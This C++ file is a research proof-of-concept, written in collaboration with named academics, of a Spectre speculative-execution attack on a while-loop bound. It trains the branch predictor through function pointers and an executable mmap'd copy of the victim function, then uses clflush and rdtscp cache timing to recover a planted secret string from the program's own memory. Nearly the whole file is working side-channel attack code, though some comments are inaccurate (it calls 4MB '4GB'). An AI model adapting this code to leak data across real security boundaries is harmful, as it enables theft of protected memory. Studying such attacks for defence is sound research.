/*
//	The following code performs the Spectre attack on a While Loop. It also trains the victim function from different locations using function pointers.
//	This code was written in collaboration with Chitchanok Chuengsatiansup, Sioli O'Connell, Rui Qi Sim and Yuval Yarom.
*/

#include <cstdint>
#include <x86intrin.h>
#include <vector>
#include <iostream>
#include <memory>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h> 
#include <unistd.h> 

void *region;

void (*execute_region)(int, volatile uint8_t*, volatile int*);

struct same_t {
    volatile uint8_t* data;
    size_t length;
};

struct different_t {
    volatile uint8_t* data;
    uint8_t padding[256];
    size_t length;
};

// Flushes the cacheline .
template<typename T>
void flush(volatile T* ptr, size_t length = sizeof(T)){
    uint8_t* byte_ptr = (uint8_t*)ptr;

    // Align to cache line
    length += (uintptr_t)byte_ptr & 0x3F;
    byte_ptr = (uint8_t*)((uintptr_t)byte_ptr & ~0x3F);

    // Flush every cacheline making up element
    for(size_t i = 0; i < length; i += 64){
        _mm_clflush(byte_ptr + i);
    }
}

//Returns the time taken for access of a given index
uint64_t time_access(volatile uint8_t* ptr, size_t index){
    uint32_t junk;
    uint64_t start = __rdtscp(&junk);
    ptr[index]++;
    uint64_t end = __rdtscp(&junk);
    return end - start;
}

volatile uint32_t spin_junk = 0;
void open_speculation_window()
{       
    for(size_t i = 0; i < 100; i++)
    {
        spin_junk = ((spin_junk + 1) * spin_junk) / (spin_junk - 1);
    }                                                                   
}


void victim(int index, volatile uint8_t* probe, volatile int* limit)
{
    asm volatile ("lfence"); //lfence stops speculation
    int transientIterations = 0;
    while(index < *limit)
    {
        index++;
        transientIterations++;
    }
    probe[(transientIterations) * 4096]++; //This works outside the while loop because all instructions are in the pipeline. The spec exe goes through as many jump instructions as it likes.
}

template<typename T> //this is called generics or templating
void training(T* handle, volatile uint8_t* probe, volatile uint8_t* fakeProbe, int training_steps, volatile int* limit, int repeat, int secretIndex)
{
    //How many times we repeat the training
    for(size_t attempts = 0; attempts < repeat; attempts++)
    {
        volatile int selectedValue;
        for(size_t step = 0; step < training_steps+1; step++)
        {
            //Select the input value.
            //Should be the training value for the duration of the training, then the misprediction value in the final step.
            volatile int selectedValue;
            int mask = (step - training_steps) >> 16;
            int trainingValue = mask & 7;
            int mispredictValue = ~mask & 12;
            selectedValue = (volatile int)(trainingValue | mispredictValue);
            limit = &selectedValue; //limits address is selected value's address

            //Select which probe table to use.
            //Should be the fakeProbe during the training, then the real probe in the final step.
            volatile uint8_t* probeToUse; //= (step < training_steps) ? fakeProbe : probe;
            uintptr_t probeAddress;
            uintptr_t probeMask = (step - training_steps) >> 16;
            uintptr_t fake = probeMask & (uintptr_t)fakeProbe;
            uintptr_t real = ~probeMask & (uintptr_t)probe;
            probeAddress = fake | real;
            probeToUse = (volatile uint8_t*)probeAddress;

            //Select which function to use.
            //I am going to test it with execute_region during the training, then the actual function (a pointer to it, victim_address) during mispeculation.
            void (*chosen_function)(int, volatile uint8_t*, volatile int*);
            uintptr_t chosenFuncAddress;
            uintptr_t funcMask = (step - training_steps) >> 16;
            uintptr_t execRegionAddr = funcMask & (uintptr_t)execute_region;
            uintptr_t victimAddr = ~funcMask & (uintptr_t)&victim;
            chosenFuncAddress = execRegionAddr | victimAddr;
            chosen_function = (void(*)(int, volatile uint8_t*, volatile int*))chosenFuncAddress;

            // === Flush stuff. ===. For testing.
            flush(limit);
            //flush(probe,4096*256); //4096*256 is the probe length
            //flush(&handle->data);
            //flush(array,  array_length);
            //flush(secret, secret_length);
            _mm_mfence();
            spin_junk = 0;
            open_speculation_window();
            spin_junk = 1;

            //execute_region(0, fakeProbe, limit);
            chosen_function(0, probeToUse, limit);
        }
    }  
}


template<typename T>
void attack(T* handle, uint8_t* buffer)
{
    // Attack configuration
    const size_t samples = 500;         //how many times we run the attack for a given secret index
    const size_t training_steps = 128;  //how many times we train the branch with invalid data before feeding a valid value, causing speculation. Flooding the PHT with "taken" values
    const size_t threshold = 100;       //Time threshold for memory access. Used during the cache timing attack
    const size_t repeat = 5;            //number of times we repeat the training

    // Configuration for locations of various components in the system. Splits up the buffer into various bits.
    volatile uint8_t* array         = buffer + 4096 * 2;    //We have architectural access to this array. Think of it as the "public" array.
    volatile size_t   array_length  = 128;                  //Array is 128 bytes.
    volatile uint8_t* secret        = array + 256;          //Our secret is 256 locations ahead of the address of the public array
    volatile size_t   secret_length = 4096;            
    volatile uint8_t* probe         = secret + 256;         //Probe table. secret + 256 instead of buffer
    volatile size_t   probe_length  = 4096*256;
    volatile uint8_t* fakeProbe = probe + 4096*257;         //4096 is the space between each element in the probe table, 20 because we won't be using the first 20 elements of the probe table
    volatile int* limit = 0;

    // Setup the array and secret data.
    handle->data   = array;             //data pointer
    handle->length = array_length;      //length. 128 bytes. Handle length will be 
    *array = 0;                         //determines our 'arbitrary throwaway' because this value will be cached
    
    int secretChars = 4;               //number of indexes in the secret
    int finalSecret[secretChars];      //readable form of the final secret
    int secretValue;                   //Storage for the secret value when we access it
    *secret = 'j';                     //The secret. Must be an integer between 1 and 256.
    secret[1] = 'a';
    secret[2] = 'c';
    secret[3] = 'k';

    //Begin the attack
    for(int secretIndex = 0; secretIndex < secretChars; secretIndex++)
    {
        std::cout << "ATTACK " << secretIndex+1 << "\n";
        size_t successes[256] = {0};               //how many times we successfully access the secret data
        for(size_t sample = 0; sample < samples; sample++)
        {
            flush(probe, probe_length);
            _mm_mfence();

            //Training. Parameters: the handle, the probe table, how many times we feed the branch invalid data, how many times we repeat the training, and what secretIndex we want to access
            training(handle, probe, fakeProbe, training_steps, limit, repeat, secretIndex);

            // std::cout << "Finished training, up to " << sample << "\n";
            //Determine the secret value at position secretIndex.

            for(int i = 1; i<256; i++)
            {
                uint64_t timeTaken  = time_access(probe, i * 4096);
                if(timeTaken < threshold)
                {
                    successes[i]++;
                }
            }
        }

        for(int i = 0; i<20; i++)
        {
            std::cout << "i is " << i << "\t| ";
            if(successes[i] == 0)
            {
                std::cout << "No cached data.\n";    
            }
            else
            {
                std::cout << "Accesses: " << successes[i] << "\n";
            }
        }
    }
    std::cout << "\n";
}




int main()
{

    region = mmap(  (void*)(((((uintptr_t)&victim + 4*1024*1024))/4096)*4096), //cast this to an int, and spaces it out by 4gb. Takes current address and adds 4gb to it.
                    8192, //8192 bytes instead of 4096.
                    PROT_READ | PROT_WRITE | PROT_EXEC,
                    MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED,
                    0, 0);

    //Check MMap worked
    if(region == MAP_FAILED)
    {
        printf("Mapping Failed\n");
        return 1;
    }

    //printf("Address of victim function: %p\n", &victim);
    //printf("Old Address that region points to: %p\n", region);
    //region = region+4182700;
    //printf("New Address that region points to: %p\n", region);



    printf("Address of victim function: %p", &victim);
    printf("\t|\tAddress of victim function as int: %ld\n", &victim);

    printf("-----------------------\n");

    printf("Address of victim function multiplied by 4GB: %p", (uintptr_t)(&victim)+4*1024*1024);
    printf("\t|\tAddress of victim function multiplied by 4GB as int: %ld\n", (uintptr_t)(&victim)+4*1024*1024);
    long int addressWeWant = (uintptr_t)(&victim)+4*1024*1024;

    printf("-----------------------\n");

    printf("Address of region: %p", region);
    printf("\t|\tAddress of victim region as int: %ld\n", region);

    printf("-----------------------\n");
    printf("Offset needed: %ld\n", addressWeWant - (uintptr_t)region); //the answer is 4182700

    printf("-----------------------\n");
    printf("Original address of region: %p", region);
    printf("\t|\tNew address: %p\n", (uintptr_t)region+4182700);



    //Setup the region
    //void (*victimPtr)(int, volatile uint8_t*, volatile int*) = &victim;
    memcpy(region, (const void*)&victim, 8192);

    execute_region = (void (*)(int, volatile uint8_t*, volatile int*))region;

    // Create a buffer and fill it.
    uint8_t* buffer = (uint8_t*)malloc(4096 * 1024);  
    for(size_t i = 0; i < 4096 * 1024; i++)
    {
        buffer[i] = 1;
    }

    // Allocate handles
    // same_t* same = (same_t*)malloc(sizeof(same_t));
    different_t* different = (different_t*)malloc(sizeof(different_t));

    //std::cout << "Same cacheline\n";
    //attack(same, buffer);

    //std::cout << "Beginning the attacks with training value of 1, then using 12.\n";
    //std::cout << "Different cacheline\n";
    attack(different, buffer);


    return 0;
}